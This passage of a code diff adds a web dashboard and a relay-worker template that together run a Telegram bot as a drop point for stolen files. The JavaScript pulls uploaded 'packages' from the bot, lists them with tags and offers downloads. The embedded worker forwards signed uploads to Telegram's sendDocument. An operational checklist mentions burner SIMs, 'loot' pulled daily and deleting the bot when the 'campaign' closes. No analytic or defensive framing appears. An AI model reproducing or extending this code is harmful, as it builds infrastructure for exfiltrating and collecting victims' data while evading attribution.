+    for(const u of j.result||[]) if(u.message&&u.message.chat) id=u.message.chat.id;
+    if(id){$('#chat').value=id;$('#chatmsg').innerHTML='<span class="ok">chat id captured</span>'}
+    else $('#chatmsg').textContent='no messages yet - tap START on the bot, send "hi", then retry';
+  }catch(e){$('#chatmsg').textContent='network error'}
+}
+
+function esc(s){return (s||'').replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]))}
+
+async function pull(){
+  const c=load();if(!c.token){$('#status').textContent='no token saved - build first';return}
+  $('#status').textContent='pulling...';
+  try{
+    const r=await fetch('https://api.telegram.org/bot'+c.token+'/getUpdates?offset='+off+'&limit=100');
+    const j=await r.json();
+    if(!j.ok){$('#status').textContent='error: '+j.description;return}
+    const h=hist();
+    for(const u of j.result||[]){
+      off=u.update_id+1;
+      const m=u.message||u.channel_post;
+      if(!m||!m.document)continue;
+      h.unshift({id:m.document.file_id,name:m.document.file_name,size:m.document.file_size,
+                 cap:m.caption||'',date:m.date});
+    }
+    localStorage.setItem('mm.off',off);
+    localStorage.setItem('mm.hist',JSON.stringify(h.slice(0,200)));
+    render();
+    $('#status').innerHTML='<span class="ok">'+h.length+' packages held locally</span>';
+  }catch(e){$('#status').textContent='network error'}
+}
+
+function render(){
+  const h=hist();
+  $('#feed').innerHTML=h.length?h.map(x=>{
+    const t=(x.cap.match(/\[([A-F0-9]{8})\]/)||[])[1]||'----';
+    return '<div class="item"><div class="meta"><span class="tag live">'+t+'</span>'+
+      '<span>'+(x.size/1048576).toFixed(2)+' MB</span></div>'+
+      '<div class="cap">'+esc(x.cap)+'</div>'+
+      '<button onclick="get(\''+x.id+'\',\''+esc(x.name)+'\')">DOWNLOAD</button></div>';
+  }).join(''):'<p class="hint">nothing yet</p>';
+}
+
+async function get(fid,name){
+  const c=load();
+  try{
+    const r=await fetch('https://api.telegram.org/bot'+c.token+'/getFile?file_id='+fid);
+    const j=await r.json();
+    if(!j.ok){alert(j.description);return}
+    window.open('https://api.telegram.org/file/bot'+c.token+'/'+j.result.file_path,'_blank');
+  }catch(e){alert('network error')}
+}
+
+function clearHist(){localStorage.removeItem('mm.hist');render()}
+
+const CHECKS=["Burner Telegram account and second SIM in place","Bot created, groups disabled, privacy on",
+"START pressed on the bot","Worker mode on, or token noted for rotation","Zip password stored outside Telegram",
+"Fresh repo, no recycled artifacts","Protect content confirmed on uploads","Loot pulled to phone storage daily",
+"Bot deleted when campaign closes"];
+$('#chk').innerHTML=CHECKS.map((t,i)=>
+ '<label class="chk"><input type="checkbox" data-i="'+i+'"><span>'+t+'</span></label>').join('');
+document.querySelectorAll('#chk input').forEach(cb=>{
+  if(localStorage.getItem('mm.c'+cb.dataset.i)){cb.checked=true;cb.parentElement.classList.add('done')}
+  cb.onchange=()=>{cb.parentElement.classList.toggle('done',cb.checked);
+    if(cb.checked)localStorage.setItem('mm.c'+cb.dataset.i,1);else localStorage.removeItem('mm.c'+cb.dataset.i)};
+});
+render();
+</script>
+
+<script type="text/plain" id="wtpl">
+export default {
+  async fetch(req, env) {
+    const u = new URL(req.url);
+    if (u.pathname !== "/up") return new Response("ok");
+    if (req.method !== "POST") return new Response("method", { status: 405 });
+    const body = await req.arrayBuffer();
+    const key = await crypto.subtle.importKey("raw", new TextEncoder().encode(env.SECRET),
+      { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
+    const mac = await crypto.subtle.sign("HMAC", key, body);
+    const hex = [...new Uint8Array(mac)].map(b => b.toString(16).padStart(2, "0")).join("");
+    if (hex !== (req.headers.get("X-Sig") || "")) return new Response("sig", { status: 401 });
+    const r = await fetch(`https://api.telegram.org/bot${env.TOKEN}/sendDocument`, {
+      method: "POST", headers: { "content-type": req.headers.get("content-type") }, body
+    });
+    return new Response(await r.text(), { status: r.status });
+  }
+}
+</script>
+</body>
+</html>
